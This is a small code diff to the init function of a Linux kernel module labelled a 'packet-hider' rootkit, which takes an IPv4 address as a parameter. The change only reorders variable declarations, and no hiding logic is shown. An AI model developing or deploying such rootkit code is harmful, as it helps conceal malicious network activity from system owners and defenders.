@@ -22,11 +22,13 @@ module_param_string(ipv4, input_ip, 16, 0);
  */
 int init_module (void)
 {	
+	u8 dst[4];
+	int ret;
+
 	ROOTKIT_DEBUG("Loading packet-hider LKM...\n");
 	
 	/* ensure the input is ipv4 address */
-	u8 dst[4];
-	int ret = in4_pton(input_ip, -1, dst, -1, NULL); // Use the same function for convert into integer
+	ret = in4_pton(input_ip, -1, dst, -1, NULL); // Use the same function for convert into integer
 	
 	if(ret == 0)
 	{
